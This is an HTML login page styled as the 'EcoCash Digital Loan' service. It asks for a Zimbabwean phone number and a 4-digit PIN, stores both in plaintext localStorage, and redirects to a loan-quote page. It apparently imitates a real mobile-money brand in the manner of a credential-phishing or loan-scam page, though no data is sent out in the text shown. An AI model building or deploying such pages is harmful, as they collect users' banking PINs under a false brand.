<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>EcoCash Digital Loan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #00a651 0%, #008541 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .login-container {
            background: white;
            border-radius: 30px;
            padding: 2rem 1.5rem;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }

        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }

        .logo h1 {
            color: #00a651;
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
        }

        .logo p {
            color: #666;
            font-size: 0.9rem;
        }

        .input-group {
            margin-bottom: 1.5rem;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #333;
            font-weight: 500;
        }

        .phone-input {
            display: flex;
            border: 2px solid #ddd;
            border-radius: 12px;
            overflow: hidden;
            transition: border-color 0.3s;
        }

        .phone-input:focus-within {
            border-color: #00a651;
        }

        .country-code {
            background: #f5f5f5;
            padding: 0.8rem 1rem;
            font-weight: bold;
            border-right: 1px solid #ddd;
        }

        .phone-input input {
            flex: 1;
            border: none;
            padding: 0.8rem;
            outline: none;
            font-size: 1rem;
        }

        input[type="password"], input[type="tel"], input[type="text"], input[type="email"], input[type="number"], input[type="date"], select, textarea {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.3s;
            font-family: inherit;
        }

        input:focus, select:focus, textarea:focus {
            border-color: #00a651;
        }

        .login-btn {
            width: 100%;
            background: #00a651;
            color: white;
            border: none;
            padding: 1rem;
            border-radius: 50px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 1rem;
            transition: transform 0.2s, background 0.2s;
        }

        .login-btn:active {
            transform: scale(0.98);
            background: #008541;
        }

        .help-buttons {
            display: flex;
            gap: 1rem;
            margin-top: 1rem;
        }

        .help-btn {
            flex: 1;
            background: #f5f5f5;
            border: none;
            padding: 0.8rem;
            border-radius: 12px;
            font-size: 0.9rem;
            cursor: pointer;
            transition: background 0.2s;
        }

        .help-btn:active {
            background: #e0e0e0;
        }

        .version {
            text-align: center;
            margin-top: 1.5rem;
            color: #999;
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>EcoCash</h1>
            <p>Digital Loan Service</p>
        </div>
        
        <div class="input-group">
            <label>Mobile Number</label>
            <div class="phone-input">
                <span class="country-code">+263</span>
                <input type="tel" id="phone" placeholder="77 123 4567">
            </div>
        </div>
        
        <div class="input-group">
            <label>PIN</label>
            <input type="password" id="pin" maxlength="4" placeholder="Enter your 4-digit PIN">
        </div>
        
        <button class="login-btn" onclick="login()">Login</button>
        
        <div class="help-buttons">
            <button class="help-btn" onclick="register()">Register</button>
            <button class="help-btn" onclick="help()">Help & Support</button>
        </div>
        
        <div class="version">v4.0.1P</div>
    </div>

    <script>
        function login() {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;
            
            if(!phone || !pin) {
                alert('Please enter your phone number and PIN');
                return;
            }
            
            if(pin.length !== 4) {
                alert('PIN must be 4 digits');
                return;
            }
            
            localStorage.setItem('userPhone', '+263' + phone);
            localStorage.setItem('userPin', pin);
            localStorage.setItem('isLoggedIn', 'true');
            
            window.location.href = 'loan-quote.html';
        }
        
        function register() {
            alert('Registration coming soon. Visit an EcoCash shop near you.');
        }
        
        function help() {
            alert('EcoCash Support: 114\nWhatsApp: +263 71 234 5678\nVisit: www.ecocash.co.zw');
        }
    </script>
</body>
</html>
